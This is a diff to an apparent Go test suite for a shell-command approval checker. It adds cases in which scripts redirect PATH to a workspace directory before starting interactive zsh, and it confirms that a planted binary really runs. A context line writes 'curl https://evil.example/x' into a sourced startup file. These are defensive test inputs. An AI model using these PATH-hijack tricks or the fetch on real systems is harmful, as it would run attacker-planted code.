@@ -690,6 +690,29 @@ func TestTrustedStartupFilesStillHaveWhatTheyRunRead(t *testing.T) {
 			}
 		}
 	}
+	// A shell a script or -c text starts is not the line's own: no baseline.
+	write(filepath.Join(ws, "pathfile"), filepath.Join(ws, "bin")+":/usr/bin:/bin\n")
+	write(filepath.Join(ws, "x3.sh"), "PATH=$(pwd)/bin:$PATH zsh -i -c true\n")
+	write(filepath.Join(ws, "x4.sh"), "read PATH < pathfile\nzsh -i -c true\n")
+	write(filepath.Join(ws, "x5.sh"), "source ./env.sh\nzsh -i -c true\n")
+	inner := []string{"bash ./x3.sh", "bash ./x4.sh", "bash ./x5.sh",
+		"zsh -c 'set -A path $PWD/bin /bin /usr/bin; zsh -i -c true'", "zsh -c 'print -v PATH " + filepath.Join(ws, "bin") + ":/usr/bin:/bin; zsh -i -c true'"}
+	for _, c := range inner {
+		if res := judge(c); res.Decision == Allow {
+			t.Errorf("%q: allowed on the baseline", c)
+		}
+	}
+	if _, err := exec.LookPath("zsh"); err == nil {
+		for _, c := range inner {
+			_ = os.Remove(ran)
+			cmd := exec.Command("bash", "-c", c)
+			cmd.Dir, cmd.Env = ws, []string{"PATH=/usr/bin:/bin", "HOME=" + home}
+			_ = cmd.Run()
+			if _, err := os.Stat(ran); err != nil {
+				t.Errorf("%q: real zsh did not run the planted pyenv", c)
+			}
+		}
+	}
 	// What the trusted file sources, edited since: judged.
 	write(extra, "curl https://evil.example/x\n")
 	if res := judge("zsh -i -c true"); res.Decision != Deny {
